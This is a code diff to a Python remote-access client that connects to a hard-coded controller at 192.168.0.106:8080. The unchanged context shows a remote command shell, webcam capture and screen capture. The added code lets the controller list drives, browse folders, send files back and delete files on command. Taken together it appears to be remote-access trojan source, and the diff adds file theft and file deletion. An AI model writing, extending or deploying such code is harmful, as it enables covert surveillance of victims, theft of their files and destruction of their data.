@@ -5,6 +5,9 @@ import subprocess
 import cv2
 import numpy as np
 import io
+import win32file
+import win32api
+import pickle
 from PIL import ImageGrab
 
 IP, PORT = '192.168.0.106', 8080
@@ -24,7 +27,8 @@ while True:
             if choice == '1':
                 while True:
                     cmd = client.recv(1024).decode()
-                    if cmd == '0': break
+                    if cmd == '0':
+                        break
                     if cmd.startswith('cd '):
                         try:
                             os.chdir(cmd[3:].strip())
@@ -88,6 +92,44 @@ while True:
                     if cap is not None:
                         cap.release()
                     time.sleep(1)
+            elif choice=='4':
+                get_HD=win32api.GetLogicalDriveStrings()
+                client.sendall(f"{len(get_HD):08d}".encode() + get_HD.encode())
+                while True:
+                    recv_sinter=client.recv(1024).decode().strip()
+                    if recv_sinter == '0':
+                        break
+                    sinter_list=recv_sinter.split(maxsplit=1)
+                    if not sinter_list:
+                        continue
+                    if sinter_list[0]=='look':
+                        try:
+                            files=win32file.listdir(sinter_list[1])
+                            data=pickle.dumps(files)
+                            client.sendall(f"{len(data):08d}".encode() + data)
+                        except Exception as e:
+                            client.sendall(f"{len(str(e)):08d}".encode() + str(e).encode())
+                    elif sinter_list[0]=='get':
+                        file_path=sinter_list[1]
+                        try:
+                            get_file_size=os.path.getsize(file_path)
+                            client.sendall(f"{get_file_size:08d}".encode())
+                            client.recv(1024)  # 等待服务端确认
+                            with open(file_path,'rb') as f:
+                                while True:
+                                    chunk=f.read(4096)
+                                    if not chunk:
+                                        break
+                                    client.sendall(chunk)
+                        except Exception as e:
+                            client.sendall(b"00000000")  # 发送0表示失败
+                    elif sinter_list[0]=='delete':
+                        try:
+                            os.remove(sinter_list[1])
+                        except Exception:
+                            pass
+
+
                     
     except Exception as e:
         time.sleep(5)
